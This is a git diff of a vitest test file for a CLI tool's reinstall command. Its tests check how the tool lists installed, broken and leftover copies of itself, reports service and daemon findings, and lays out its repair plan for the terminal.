@@ -6,10 +6,11 @@
 // the sign and the verb of a row must say its kind by themselves.
 import path from "node:path";
 import { describe, expect, it } from "vitest";
-import type { Copy, Inventory } from "../src/reinstall/find.js";
+import type { Copy, Home, Inventory } from "../src/reinstall/find.js";
 import { found, leftAlone, planned, usedBy } from "../src/reinstall/page.js";
 import { type Facts, type Left, type Plan, plan, type Step, slotIn } from "../src/reinstall/plan.js";
-import { cols, MAX_WIDTH, makeUi, mark, PLAIN, plain, tint, type Ui } from "../src/style.js";
+import { shq } from "../src/shell.js";
+import { clean, cols, MAX_WIDTH, makeUi, mark, PLAIN, plain, tint, type Ui } from "../src/style.js";
 
 const ESC = String.fromCharCode(27);
 const TTY: Ui = makeUi({ isTTY: true, columns: 80, env: {}, platform: "darwin" });
@@ -23,45 +24,53 @@ const ROOT = path.resolve(path.sep, "w");
 /** The folder a place stands for here: nothing is opened, a plan only compares them. */
 const folder = (where: string): string => path.join(ROOT, ...where.split(/[^\w.-]+/).filter(Boolean));
 const LOCAL = folder("~/.local");
-/** A published copy as the look lists it: whole, running, used by nothing. `where` is
- *  all the page shows of its place. */
+/** A published copy as the look lists it: whole, used by nothing. `where` is all the
+ *  page shows of its place. One that was left behind by an install is beside the slot,
+ *  under the name npm gives such a folder. */
 const copy = (where: string, over: Partial<Copy> = {}): Copy => {
   const prefix = folder(where);
   return {
-    dir: slotIn(prefix, "linux"),
+    dir: over.aside ? path.join(path.dirname(slotIn(prefix)), ".sessionpipe-Zz9Yy8Xx") : slotIn(prefix),
     where,
     prefix,
     slot: "global",
     not: null,
     aside: false,
     version: "1.2.0",
-    runs: true,
     wrong: null,
     bins: [],
     uses: [],
+    onPath: true,
     writable: true,
     keeper: null,
     ...over,
   };
 };
+/** Where the one copy lives: a prefix this user may write, whose bin folder a shell looks in. */
+const home = (where = "~/.local", over: Partial<Home> = {}): Home => ({
+  prefix: folder(where),
+  shown: where,
+  why: "where the one you type is",
+  bin: path.join(folder(where), "bin"),
+  onPath: true,
+  blocked: null,
+  writable: true,
+  ...over,
+});
+/** What a look found. The page reads the copies and the links that lead nowhere; what is
+ *  typed and where the home is are the plan's to read. */
 const inv = (copies: Copy[], over: Partial<Inventory> = {}): Inventory => ({
-  platform: "linux",
   reach: true,
   copies,
   dangling: [],
   strangers: [],
   onPath: [],
-  homes: [
-    {
-      prefix: LOCAL,
-      shown: "~/.local",
-      why: "where the one you type is",
-      bin: path.join(LOCAL, "bin"),
-      pathAt: 0,
-      blocked: null,
-    },
-  ],
+  typed: copies.find((c) => c.uses.includes("typed"))?.dir ?? null,
+  unsure: null,
+  home: home(),
+  taken: null,
   prefixes: [],
+  npx: folder("~/.npm/_npx"),
   ...over,
 });
 type Service = NonNullable<Facts["service"]>;
@@ -88,7 +97,7 @@ const facts = (over: Partial<Facts> = {}): Facts => ({
   apart: null,
   ...over,
 });
-const SAFE = "Nothing is touched until 1.2.0 has downloaded. A failed install is undone.";
+const SAFE = "Nothing is touched until 1.2.0 has been downloaded and seen to run.";
 const RESTARTS = "The service keeps its environment and restarts once it holds nothing.";
 /** The two steps every plan has, neither with a row of its own. */
 const FETCH: Step = { do: "fetch", version: "1.2.0", touches: [] };
@@ -98,11 +107,11 @@ const aPlan = (over: Partial<Plan> = {}): Plan => ({
   refuse: null,
   target: "1.2.0",
   home: null,
+  stays: null,
   steps: [FETCH, PROVE],
   safety: [SAFE],
   left: [],
   notes: [],
-  first: null,
   ...over,
 });
 /** A step as the plan writes one, by what its row says: the page reads nothing else of it. */
@@ -110,13 +119,12 @@ const install = (say: string): Step => ({
   do: "install",
   version: "1.2.0",
   prefix: LOCAL,
-  dir: slotIn(LOCAL, "linux"),
+  dir: slotIn(LOCAL),
   replaces: true,
   touches: [],
   say,
 });
 const stop = (say: string): Step => ({ do: "stop", pid: 222, touches: [], say });
-const unserve = (say: string): Step => ({ do: "unserve", file: service().file, touches: [], say });
 const use = (say: string | null): Step => ({ do: "use", serve: true, touches: [], say });
 const remove = (say: string): Step => ({ do: "remove", path: path.join(ROOT, "gone"), touches: [], say });
 /** What stays, as the plan lists it. Its whole path is never the page's to show. */
@@ -131,26 +139,30 @@ const left = (where: string, why: string, over: Partial<Left> = {}): Left => ({
 });
 
 const ONE = copy("~/.local", { uses: ["typed", "service", "this", "hooks"] });
+/** What the look says is wrong with a copy: each is a few words of its own. */
 const BROKEN = "its dist/cli.js is missing (an install that was cut off?)";
+const MUTE = "it doesn't run: `--version` printed nothing";
 const CUT_OFF = "left behind by an install that was cut off";
 const CHECKOUT = "it holds src, which no published sessionpipe has (a checkout or a build?)";
 /** A copy in the npx cache: its place is the cache entry it is in. */
 const NPX = copy("~/.npm/_npx/0a1b2c3d4e5f6a7b", { slot: "npx", prefix: null, uses: ["this"] });
-/** A computer after several installs: two releases in use, a copy in the npx cache, a
- *  broken one, npm's own leftover, and a checkout. Every folder is short. */
+/** A folder that is no install of sessionpipe: a checkout someone builds in. The proof
+ *  refuses it, so it has no slot, and why is in `not`. */
+const CHECKED_OUT = copy("~/code/sessionpipe", { version: "1.3.0", slot: null, prefix: null, not: CHECKOUT });
+/** A computer after several installs: two releases in use, a copy in the npx cache, one
+ *  that is not whole, npm's own leftover, and a checkout. Every folder is short. */
 const SEVERAL = [
-  copy("~/.local", { version: "1.1.0", uses: ["typed", "this"] }),
+  copy("~/.local", { version: "1.1.0", uses: ["typed"] }),
   copy("~/.nvm/versions/node/v22.1.0", { version: "1.1.0", uses: ["service", "hooks"] }),
   NPX,
-  copy("/opt/homebrew", { version: null, runs: false, wrong: BROKEN }),
-  copy("/usr/local", { aside: true, runs: false, wrong: CUT_OFF }),
-  copy("~/code/sessionpipe", { version: "1.3.0", slot: null, not: CHECKOUT }),
+  copy("/opt/homebrew", { version: "1.0.0", wrong: BROKEN }),
+  copy("/usr/local", { aside: true, version: null, wrong: CUT_OFF }),
+  CHECKED_OUT,
 ];
-/** Volta's copy, whose folder is longer than a column of the table may be. */
+/** Volta's copy, whose folder is longer than a column of the table may be: no install of
+ *  ours either, for Volta keeps it. */
 const VOLTA = copy("~/.volta/tools/image/packages/sessionpipe", {
   slot: null,
-  runs: false,
-  wrong: "it doesn't run: `--version` printed nothing",
   not: "Volta keeps it",
   keeper: "volta uninstall sessionpipe",
 });
@@ -180,29 +192,116 @@ describe("found: every copy, its release, and what uses it", () => {
     ]);
     // A service that runs what it should, with the daemon that is its own, is nothing to say.
     expect(
-      found(PLAIN, inv([ONE]), facts({ service: service(), daemon: { pid: 100, version: "1.2.0" } })),
+      found(PLAIN, inv([ONE]), facts({ service: service(), daemon: { pid: 100, version: "1.2.0", byHand: null } })),
     ).toHaveLength(2);
     // Nor is a daemon someone runs by hand where there is no service file.
-    expect(found(PLAIN, inv([ONE]), facts({ daemon: { pid: 222, version: "1.2.0" } }))).toHaveLength(2);
+    expect(found(PLAIN, inv([ONE]), facts({ daemon: { pid: 222, version: "1.2.0", byHand: null } }))).toHaveLength(2);
   });
 
-  it("several: a row each in columns, the release first; a leftover and a broken copy are named there and marked", () => {
+  it("several: a row each in columns, the release first; a leftover and a copy that is not whole are named there and marked", () => {
     expect(found(PLAIN, inv(SEVERAL), facts())).toEqual([
-      "Found 6 copies of sessionpipe on this computer",
+      // The checkout is no copy: it is not counted, and has no row here.
+      "Found 5 copies of sessionpipe on this computer",
       "  · 1.1.0      ~/.local                      you type this",
       "  · 1.1.0      ~/.nvm/versions/node/v22.1.0  the background service, the hooks",
       "  · 1.2.0      ~/.npm/_npx/0a1b2c3d4e5f6a7b  this command",
-      "  ✗ broken     /opt/homebrew                 nothing uses it · its dist/cli.js is missing (an install that was cut off?)",
+      "  ✗ 1.0.0      /opt/homebrew                 nothing uses it · its dist/cli.js is missing (an install that was cut off?)",
       "  ✗ left over  /usr/local                    nothing uses it · left behind by an install that was cut off",
-      // Why it is no install is said once, on its row under "Left alone": here, only that it is none.
-      "  · 1.3.0      ~/code/sessionpipe            nothing uses it · not an install",
     ]);
     expect(found(PLAIN, inv(SEVERAL), facts()).join("\n")).not.toContain(CHECKOUT);
   });
 
+  it("what is left of a copy that was emptied (ours, of no release: a folder left behind, in the slot itself) is a leftover by that name: in the table, and in the plan's row for it", () => {
+    // An empty folder of the name in a slot: the proof accepts it, and the look calls it
+    // a folder left behind, as it calls npm's own beside a slot.
+    const LEFT = "left behind by an install that was cut off";
+    const emptied = copy("/usr/local", { dir: slotIn(folder("/usr/local")), aside: true, version: null, wrong: LEFT });
+    const lines = found(PLAIN, inv([ONE, emptied]), facts());
+    expect(lines).toEqual([
+      "Found 2 copies of sessionpipe on this computer",
+      "  · 1.2.0      ~/.local    you type this, the background service, the hooks",
+      "  ✗ left over  /usr/local  nothing uses it · left behind by an install that was cut off",
+    ]);
+    expect(lines.join("\n")).not.toMatch(/null|undefined/);
+    // Where the folders are long, on a line of its own.
+    const deep = copy("~/.local/share/fnm/node-versions/v22.11.0/installation", {
+      dir: slotIn(folder("~/.local/share/fnm/node-versions/v22.11.0/installation")),
+      aside: true,
+      version: null,
+      wrong: LEFT,
+    });
+    expect(found(PLAIN, inv([ONE, deep]), facts()).slice(-2)).toEqual([
+      "  ✗ ~/.local/share/fnm/node-versions/v22.11.0/installation",
+      "      left over · nothing uses it · left behind by an install that was cut off",
+    ]);
+    // The plan removes it under the same name a leftover of npm's has.
+    const p = plan(inv([ONE, emptied]), facts());
+    expect(planned(PLAIN, p)).toContain("  - remove   a leftover folder in /usr/local");
+    expect(planned(PLAIN, p).join("\n")).not.toMatch(/null|undefined/);
+    // In the home's own slot it is no copy that is there: the install row gives the
+    // home's reason ("replaces null" was said), and no row removes it.
+    const inHome = copy("~/.local", { dir: slotIn(LOCAL), aside: true, version: null, wrong: LEFT });
+    const fresh = planned(PLAIN, plan(inv([inHome]), facts()));
+    expect(fresh.filter((l) => /^ {2}[+-] /.test(l))).toEqual([
+      expect.stringMatching(/^ {2}\+ install {2}1\.2\.0, the newest release, fresh in ~\/\.local \(.+\)$/),
+    ]);
+    expect(fresh.join("\n")).not.toMatch(/null|replaces/);
+  });
+
+  it("L10: only a folder the proof accepts is a copy: what is no install of sessionpipe is not counted, and has no row", () => {
+    /** Another package under the name, a project's own dependency, a checkout, Volta's. */
+    const LEFT_PAD = copy("~/.npm-global", {
+      slot: null,
+      version: null,
+      not: 'its package.json says it is "left-pad", not sessionpipe',
+    });
+    const DEPENDENCY = copy("~/work/app/lib/node_modules/sessionpipe", {
+      slot: null,
+      prefix: null,
+      uses: ["this"],
+      not: "the node_modules folder it is in is a project's own (a package.json is beside it)",
+    });
+    const REFUSED = [LEFT_PAD, DEPENDENCY, CHECKED_OUT, VOLTA];
+    for (const ui of [PLAIN, MONO, TTY, WIDE]) {
+      // None that is one: said as that, in one line.
+      expect(found(ui, inv(REFUSED), facts()).map(plain)).toEqual(["Found no copy of sessionpipe on this computer"]);
+      // One beside them is one copy; two are two. The rows are the rows of those alone:
+      // not even the layout is theirs to change (Volta's folder is too long for a column).
+      expect(found(ui, inv([LEFT_PAD, ONE, ...REFUSED]), facts())).toEqual(found(ui, inv([ONE]), facts()));
+      const two = [ONE, copy("/opt/homebrew", { version: "1.0.0", wrong: BROKEN })];
+      expect(found(ui, inv([DEPENDENCY, two[0] as Copy, VOLTA, two[1] as Copy, CHECKED_OUT]), facts())).toEqual(
+        found(ui, inv(two), facts()),
+      );
+      expect(plain(found(ui, inv(two), facts())[0] as string)).toBe("Found 2 copies of sessionpipe on this computer");
+      // Nothing of them is on this screen: not a folder, not a reason, not the release one names.
+      const screen = found(ui, inv([...REFUSED, ...two]), facts())
+        .map(plain)
+        .join("\n");
+      for (const c of REFUSED) {
+        expect(screen).not.toContain(c.where);
+        expect(screen).not.toContain(c.not as string);
+      }
+      expect(screen).not.toMatch(/not an install|left-pad|1\.3\.0/);
+    }
+    expect(found(PLAIN, inv([ONE, ...REFUSED]), facts())[0]).toBe("Found one copy of sessionpipe on this computer");
+    // Where they are said is the plan's list of what is left alone, a row each, with why.
+    const p = plan(inv([ONE, ...REFUSED]), facts());
+    expect(leftAlone(PLAIN, p.left)).toEqual([
+      "Left alone",
+      "  · ~/.npm-global",
+      '      its package.json says it is "left-pad", not sessionpipe',
+      "  · ~/work/app/lib/node_modules/sessionpipe",
+      "      the node_modules folder it is in is a project's own (a package.json is beside it)",
+      "  · ~/code/sessionpipe",
+      "      it holds src, which no published sessionpipe has (a checkout or a build?)",
+      "  · ~/.volta/tools/image/packages/sessionpipe",
+      "      Volta keeps it: `volta uninstall sessionpipe` removes it",
+    ]);
+  });
+
   it("a folder too long for a column: every copy's folder gets a line of its own, and the rest goes under it", () => {
-    expect(found(PLAIN, inv([...SEVERAL, VOLTA]), facts())).toEqual([
-      "Found 7 copies of sessionpipe on this computer",
+    expect(found(PLAIN, inv([...SEVERAL, copy(FNM, { wrong: MUTE })]), facts())).toEqual([
+      "Found 6 copies of sessionpipe on this computer",
       "  · ~/.local",
       "      1.1.0 · you type this",
       "  · ~/.nvm/versions/node/v22.1.0",
@@ -210,16 +309,12 @@ describe("found: every copy, its release, and what uses it", () => {
       "  · ~/.npm/_npx/0a1b2c3d4e5f6a7b",
       "      1.2.0 · this command",
       "  ✗ /opt/homebrew",
-      "      broken · nothing uses it · its dist/cli.js is missing (an install that was cut off?)",
+      "      1.0.0 · nothing uses it · its dist/cli.js is missing (an install that was cut off?)",
       "  ✗ /usr/local",
       "      left over · nothing uses it · left behind by an install that was cut off",
-      "  · ~/code/sessionpipe",
-      "      1.3.0 · nothing uses it · not an install",
-      "  ✗ ~/.volta/tools/image/packages/sessionpipe",
-      // What is wrong with it is said; who keeps it, and the command that removes it, are not.
-      "      1.2.0 · nothing uses it · it doesn't run: `--version` printed nothing · not an install",
+      `  ✗ ${FNM}`,
+      "      1.2.0 · nothing uses it · it doesn't run: `--version` printed nothing",
     ]);
-    expect(found(PLAIN, inv([...SEVERAL, VOLTA]), facts()).join("\n")).not.toMatch(/Volta keeps it|volta uninstall/);
     // One such folder is enough, wherever it is in the list, and with one copy too.
     expect(found(PLAIN, inv([copy(FNM, { uses: ["typed"] }), NPX]), facts())).toEqual([
       "Found 2 copies of sessionpipe on this computer",
@@ -248,14 +343,25 @@ describe("found: every copy, its release, and what uses it", () => {
     ]);
   });
 
-  it("a copy that doesn't run is marked even where nothing more is known of it", () => {
-    const [, row] = found(PLAIN, inv([copy("~/.local", { runs: false })]), facts());
-    expect(row).toBe("  ✗ 1.2.0  ~/.local  nothing uses it");
+  it("a copy is marked by what is wrong with it, said after what uses it; one with nothing wrong is not marked", () => {
+    const row = (over: Partial<Copy>) => found(PLAIN, inv([copy("~/.local", over)]), facts())[1];
+    expect(row({})).toBe("  · 1.2.0  ~/.local  nothing uses it");
+    expect(row({ wrong: MUTE })).toBe(
+      "  ✗ 1.2.0  ~/.local  nothing uses it · it doesn't run: `--version` printed nothing",
+    );
+    expect(row({ wrong: "npm's link to it is gone", uses: ["service"] })).toBe(
+      "  ✗ 1.2.0  ~/.local  the background service · npm's link to it is gone",
+    );
     // On a line of its own the folder carries the mark.
-    expect(found(PLAIN, inv([copy(FNM, { runs: false })]), facts()).slice(1)).toEqual([
+    expect(found(PLAIN, inv([copy(FNM, { wrong: MUTE })]), facts()).slice(1)).toEqual([
       `  ✗ ${FNM}`,
-      "      1.2.0 · nothing uses it",
+      "      1.2.0 · nothing uses it · it doesn't run: `--version` printed nothing",
     ]);
+    // In colour: red for one that has something wrong, dim for one that has not.
+    expect(found(TTY, inv([copy("~/.local", { wrong: MUTE })]), facts())[1]?.startsWith(`  ${mark(TTY, "bad")} `)).toBe(
+      true,
+    );
+    expect(found(TTY, inv([copy("~/.local")]), facts())[1]?.startsWith(`  ${mark(TTY, "info")} `)).toBe(true);
   });
 
   it("'this command' is said only of a copy nobody types", () => {
@@ -278,7 +384,7 @@ describe("found: every copy, its release, and what uses it", () => {
     const i = inv([ONE], {
       dangling: ["/usr/local/bin/sessionpipe", "/home/u/.nvm/versions/node/v20.0.0/bin/sessionpipe"],
       // Not wrong, and not this command's: it is a row under "Left alone", and no finding.
-      strangers: [{ file: "/home/u/bin/sessionpipe", why: "a file of that name that npm didn't put there" }],
+      strangers: [{ file: "/home/u/bin/sessionpipe", why: "a file npm didn't put there" }],
     });
     const f = facts({
       hooks: {
@@ -313,21 +419,21 @@ describe("found: every copy, its release, and what uses it", () => {
   it("a link that leads nowhere and the node a service file names are said as the caller shows a path; nothing else is", () => {
     /** A `show` that marks what it was handed, as the command's `~/…` would shorten it. */
     const show = (p: string) => `<${p}>`;
-    const i = inv([ONE, copy("/opt/homebrew", { version: null, runs: false, wrong: BROKEN })], {
+    const i = inv([ONE, copy("/opt/homebrew", { version: "1.0.0", wrong: BROKEN })], {
       dangling: ["/usr/local/bin/sessionpipe", "/home/u/.nvm/versions/node/v20.0.0/bin/sessionpipe"],
-      strangers: [{ file: "/home/u/bin/sessionpipe", why: "a file of that name that npm didn't put there" }],
+      strangers: [{ file: "/home/u/bin/sessionpipe", why: "a file npm didn't put there" }],
     });
     const f = facts({
       hooks: { version: "1.1.0", wrong: ["claude: missing (/home/u/.claude/settings.json)"] },
       service: service({ node: "/gone/bin/node", nodeOk: false }),
-      daemon: { pid: 100, version: "1.2.0" },
+      daemon: { pid: 100, version: "1.2.0", byHand: null },
     });
     const lines = found(PLAIN, i, f, show);
     expect(lines).toEqual([
       "Found 2 copies of sessionpipe on this computer",
       // A copy's place is the look's own word for it, shortened already.
-      "  · 1.2.0   ~/.local       you type this, the background service, the hooks",
-      "  ✗ broken  /opt/homebrew  nothing uses it · its dist/cli.js is missing (an install that was cut off?)",
+      "  · 1.2.0  ~/.local       you type this, the background service, the hooks",
+      "  ✗ 1.0.0  /opt/homebrew  nothing uses it · its dist/cli.js is missing (an install that was cut off?)",
       "",
       "Also found",
       "  ! </usr/local/bin/sessionpipe> is a link to a sessionpipe that is gone",
@@ -366,7 +472,7 @@ describe("found: every copy, its release, and what uses it", () => {
 
   it("also found, of the service alone: each thing by itself", () => {
     const also = (f: Partial<Facts>) => found(PLAIN, inv([ONE]), facts(f)).slice(2);
-    const up = { pid: 100, version: "1.2.0" };
+    const up = { pid: 100, version: "1.2.0", byHand: null };
     // A service file with no program in it names no node.
     expect(also({ service: service({ node: null, nodeOk: false }), daemon: up })).toEqual([
       "",
@@ -393,13 +499,15 @@ describe("found: every copy, its release, and what uses it", () => {
       "Also found",
       "  ! the service is loaded, and nothing answers",
     ]);
-    expect(also({ service: service(), daemon: { pid: 222, version: "1.2.0" } })).toEqual([
+    expect(also({ service: service(), daemon: { pid: 222, version: "1.2.0", byHand: null } })).toEqual([
       "",
       "Also found",
       "  ! a daemon someone started by hand (pid 222) holds the socket the service needs",
     ]);
-    // Not loaded, and a daemon answers all the same: both are said.
-    expect(also({ service: service({ loaded: false, pid: null }), daemon: { pid: 222, version: "1.2.0" } })).toEqual([
+    // Not loaded, and a daemon that says someone started it answers all the same: both are said.
+    expect(
+      also({ service: service({ loaded: false, pid: null }), daemon: { pid: 222, version: "1.2.0", byHand: true } }),
+    ).toEqual([
       "",
       "Also found",
       "  ! the service file is there, and the service is not loaded",
@@ -407,50 +515,110 @@ describe("found: every copy, its release, and what uses it", () => {
     ]);
   });
 
-  it("also found: a service file on a computer that needs no service, which is why the plan removes it", () => {
+  it("two daemons are found by the plan's own definition: never where the manager names the daemon that answers; else by the daemon's own word, or by its being another process where it doesn't say", () => {
+    const BY_HAND = (pid: number) =>
+      `  ! a daemon someone started by hand (pid ${pid}) holds the socket the service needs`;
+    /** Who the manager names (the daemon that answers is pid 7), what the daemon says of
+     *  who started it, and whether the page says there are two. */
+    const TABLE: [number | null, boolean | null, boolean][] = [
+      [7, false, false],
+      [7, null, false],
+      [7, true, false],
+      [100, true, true],
+      [100, false, false],
+      [100, null, true],
+      [null, true, true],
+      [null, false, false],
+      [null, null, false],
+    ];
+    for (const [pid, byHand, two] of TABLE) {
+      const f = facts({ service: service({ pid }), daemon: { pid: 7, version: "1.2.0", byHand } });
+      const lines = found(PLAIN, inv([ONE]), f);
+      expect(lines.includes(BY_HAND(7)), `${pid} ${byHand}`).toBe(two);
+      // It is the one thing found of such a service, or nothing is: no heading for nothing.
+      expect(lines.slice(2), `${pid} ${byHand}`).toEqual(two ? ["", "Also found", BY_HAND(7)] : []);
+      // And the plan for the same facts stops that daemon in the same rows: the page and
+      // the plan read one definition.
+      expect(
+        plan(inv([ONE]), f).steps.some((s) => s.do === "stop"),
+        `${pid} ${byHand}`,
+      ).toBe(two);
+    }
+    // With no service file there are no two, whatever a daemon says of itself.
+    for (const byHand of [true, false, null])
+      expect(
+        found(PLAIN, inv([ONE]), facts({ service: null, daemon: { pid: 7, version: "1.2.0", byHand } })),
+      ).toHaveLength(2);
+  });
+
+  it("L8: a service file on a computer that needs no service is no finding: nothing is found of it, the plan leaves the file, and says nothing of it", () => {
     const also = (f: Partial<Facts>) => found(PLAIN, inv([ONE]), facts(f)).slice(2);
-    const unneeded = "  ! nothing here needs the background service: paired with nobody, the pool off, asking off";
-    // Loaded, and nothing answers: said after that.
-    expect(also({ service: service(), wanted: false, daemon: null })).toEqual([
+    // A service file nothing here needs, with no daemon answering, is nobody's to mend:
+    // whatever its manager says of it, and whatever it names, nothing is found. ("Also
+    // found ! the service is loaded, and nothing answers" stood above "✓ Nothing to
+    // repair" on a computer doctor calls all good.)
+    for (const s of [
+      service(),
+      service({ loaded: false, pid: null }),
+      service({ node: null, nodeOk: false, cliOk: false }),
+      service({ loaded: false, pid: null, nodeOk: false, cliOk: false }),
+    ])
+      expect(also({ service: s, wanted: false, daemon: null })).toEqual([]);
+    // What is said of a service is said of one this computer wants, or runs.
+    expect(also({ service: service(), wanted: true, daemon: null })).toEqual([
       "",
       "Also found",
       "  ! the service is loaded, and nothing answers",
-      unneeded,
     ]);
-    // Not loaded either.
-    expect(also({ service: service({ loaded: false, pid: null }), wanted: false })).toEqual([
+    // Nothing here needs it and a daemon answers all the same: it is run, so it is said.
+    const up = { pid: 100, version: "1.2.0", byHand: null };
+    expect(also({ service: service({ loaded: false, pid: 100 }), wanted: false, daemon: up })).toEqual([
       "",
       "Also found",
       "  ! the service file is there, and the service is not loaded",
-      unneeded,
     ]);
-    // While a daemon answers the file stays (the plan moves it onto the fresh copy): not said.
-    expect(also({ service: service(), wanted: false, daemon: { pid: 100, version: "1.2.0" } })).toEqual([]);
-    expect(also({ service: service(), wanted: false, daemon: { pid: 222, version: "1.2.0" } })).toEqual([
+    expect(
+      also({ service: service({ node: null, nodeOk: false, cliOk: false, pid: 100 }), wanted: false, daemon: up }),
+    ).toEqual([
       "",
       "Also found",
-      "  ! a daemon someone started by hand (pid 222) holds the socket the service needs",
+      "  ! the service file names a node that is gone (?)",
+      "  ! the service file names a copy of sessionpipe that is gone",
     ]);
-    // Something here needs it, or there is no file to speak of: not said.
-    expect(also({ service: service(), daemon: null }).join("\n")).not.toContain("nothing here needs");
+    // A socket file with nothing behind it is said whoever needs the service.
+    expect(also({ service: service(), wanted: false, daemon: null, staleSocket: true })).toEqual([
+      "",
+      "Also found",
+      "  ! a socket file is there with no daemon behind it (the next one that starts replaces it)",
+    ]);
+    expect(also({ service: service(), wanted: false, daemon: { pid: 100, version: "1.2.0", byHand: null } })).toEqual(
+      [],
+    );
     expect(also({ wanted: false })).toEqual([]);
-    expect(also({ wanted: false, daemon: { pid: 222, version: "1.2.0" } })).toEqual([]);
-    // It is the state the plan answers with the removal of the file, and no other.
-    for (const f of [
-      { service: service(), wanted: false, daemon: null },
-      { service: service(), wanted: false, daemon: { pid: 100, version: "1.2.0" } },
-      { service: service(), daemon: null },
-      { wanted: false },
-    ]) {
-      const unserved = plan(inv([ONE]), facts(f)).steps.some((s) => s.do === "unserve");
-      expect(found(PLAIN, inv([ONE]), facts(f)).includes(unneeded)).toBe(unserved);
-    }
-    // At a terminal it folds under its own words, as every finding does.
-    const folded = found(TTY, inv([ONE]), facts({ service: service(), wanted: false, daemon: null })).slice(-2);
-    expect(folded.map(plain)).toEqual([
-      "  ! nothing here needs the background service: paired with nobody, the pool",
-      "    off, asking off",
+    // The plan for such a computer, with a second copy to remove: no row takes the service
+    // file away, no step touches it, and nothing is said of it. It is no finding, of this
+    // command's as of doctor's: a note here made "nothing to repair" something else on a
+    // computer doctor calls all good.
+    const two = inv([ONE, copy("~/.nvm/versions/node/v22.1.0", { version: "1.1.0" })]);
+    const idle = facts({ service: service(), wanted: false, daemon: null });
+    const p = plan(two, idle);
+    expect(p.notes).toEqual([]);
+    expect(p.steps.flatMap((s) => s.touches)).not.toContain(service().file);
+    expect(planned(PLAIN, p)).toEqual([
+      "This will",
+      "  + install  1.2.0, the newest release, fresh in ~/.local (replaces 1.2.0)",
+      "  ~ switch   the hooks to it",
+      "  - remove   1.1.0 in ~/.nvm/versions/node/v22.1.0",
+      "  = keep     pairings, settings, keys, messages waiting to be sent",
+      "",
+      SAFE,
     ]);
+    for (const ui of [PLAIN, TTY]) expect(planned(ui, p).map(plain).join("\n")).not.toMatch(/service file/);
+    // With that one copy alone it is a computer with nothing to repair, and no note.
+    const one = plan(inv([ONE]), idle);
+    expect(one.steps).toEqual([]);
+    expect(one.notes).toEqual([]);
+    expect(one.nothing).toBe("Nothing to repair: one sessionpipe, 1.2.0, the newest release.");
   });
 
   it("at an 80-column terminal every line fits, in colour, and says what the whole lines say", () => {
@@ -459,33 +627,33 @@ describe("found: every copy, its release, and what uses it", () => {
       copy("~/.local", { version: "1.1.0", uses: ["typed", "this"] }),
       copy("~/.nvm/versions/node/v22.1.0", { version: "1.1.0", uses: ["service", "hooks"] }),
       copy("~/.npm/_npx/0a1b2c3d4e5f6a7b", { slot: "npx", prefix: null }),
-      copy("/opt/homebrew", { version: null, runs: false, wrong: BROKEN }),
-      copy("~/code/sessionpipe", { version: "1.3.0", slot: null, not: CHECKOUT }),
+      copy("/opt/homebrew", { version: "1.0.0", wrong: BROKEN }),
+      CHECKED_OUT,
     ];
     const i = inv(copies, {
       dangling: ["/usr/local/bin/sessionpipe", "/home/u/.nvm/versions/node/v20.0.0/bin/sessionpipe"],
-      strangers: [{ file: "/home/u/bin/sessionpipe", why: "a file of that name that npm didn't put there" }],
+      strangers: [{ file: "/home/u/bin/sessionpipe", why: "a file npm didn't put there" }],
     });
     const f = facts({
       hooks: { version: "1.1.0", wrong: ["claude: missing (~/.claude/settings.json)"] },
       service: service({ loaded: false, pid: null, node: "/gone/bin/node", nodeOk: false, cliOk: false }),
       staleSocket: true,
-      daemon: { pid: 222, version: "1.1.0" },
+      daemon: { pid: 222, version: "1.1.0", byHand: null },
     });
     const lines = found(TTY, i, f);
     fits(lines, found(PLAIN, i, f));
     // What uses a copy folds under its own column.
     expect(lines.length).toBeGreaterThan(found(PLAIN, i, f).length);
-    expect(lines[0]).toBe(tint(TTY, "bold", "Found 5 copies of sessionpipe on this computer"));
+    expect(lines[0]).toBe(tint(TTY, "bold", "Found 4 copies of sessionpipe on this computer"));
     expect(lines).toContain(tint(TTY, "bold", "Also found"));
     // The marks are in their colours: a copy that is whole, a broken one, a finding.
     expect(lines[1]?.startsWith(`  ${mark(TTY, "info")} 1.1.0 `)).toBe(true);
-    expect(lines.some((l) => l.startsWith(`  ${mark(TTY, "bad")} broken `))).toBe(true);
+    expect(lines.some((l) => l.startsWith(`  ${mark(TTY, "bad")} 1.0.0 `))).toBe(true);
     expect(lines.some((l) => l.startsWith(`  ${mark(TTY, "warn")} /usr/local/bin/sessionpipe is a link`))).toBe(true);
     // What is said of a copy folds under its own column, past the release and the folder.
     const column = plain(lines[1] as string).indexOf("you type this");
     expect(column).toBeGreaterThan(0);
-    const broken = lines.findIndex((l) => l.startsWith(`  ${mark(TTY, "bad")} broken `));
+    const broken = lines.findIndex((l) => l.startsWith(`  ${mark(TTY, "bad")} 1.0.0 `));
     expect(plain(lines[broken + 1] as string)).toMatch(new RegExp(`^ {${column}}\\S`));
     // A finding too long for the line goes on under its own words, not under its mark.
     const also = lines.slice(lines.indexOf(tint(TTY, "bold", "Also found")) + 1);
@@ -494,7 +662,11 @@ describe("found: every copy, its release, and what uses it", () => {
     const long = also.findIndex((l) => plain(l).startsWith("  ! /home/u/.nvm/versions/node/v20.0.0/bin/sessionpipe "));
     expect(plain(also[long + 1] as string)).toMatch(/^ {4}\S/);
     // A leftover's row too, beside copies in short places.
-    const withLeftover = inv([copies[0] as Copy, copies[1] as Copy, copy("~/.local", { aside: true, wrong: CUT_OFF })]);
+    const withLeftover = inv([
+      copies[0] as Copy,
+      copies[1] as Copy,
+      copy("~/.local", { aside: true, version: null, wrong: CUT_OFF }),
+    ]);
     fits(found(TTY, withLeftover, facts()), found(PLAIN, withLeftover, facts()));
     fits(found(TTY, inv([ONE]), facts()), found(PLAIN, inv([ONE]), facts()));
   });
@@ -502,8 +674,8 @@ describe("found: every copy, its release, and what uses it", () => {
   it("at 80 columns a copy in the npx cache beside a leftover fits: the widest row the table has", () => {
     // `npx -y sessionpipe@latest reinstall` on a computer whose install was cut off.
     const copies = [
-      copy("~/.local", { version: null, runs: false, wrong: BROKEN, uses: ["typed"] }),
-      copy("~/.local", { aside: true, runs: false, wrong: CUT_OFF }),
+      copy("~/.local", { version: "1.1.0", wrong: BROKEN, uses: ["typed"] }),
+      copy("~/.local", { aside: true, version: null, wrong: CUT_OFF }),
       NPX,
       copy("~/.nvm/versions/node/v22.1.0", { version: "1.1.0", uses: ["service", "hooks"] }),
     ];
@@ -519,22 +691,23 @@ describe("found: every copy, its release, and what uses it", () => {
   });
 
   it("at 80 columns an fnm prefix fits: the folder whole on its own line, the rest folded under it", () => {
+    const ASDF = "~/.asdf/installs/nodejs/22.11.0";
     const copies = [
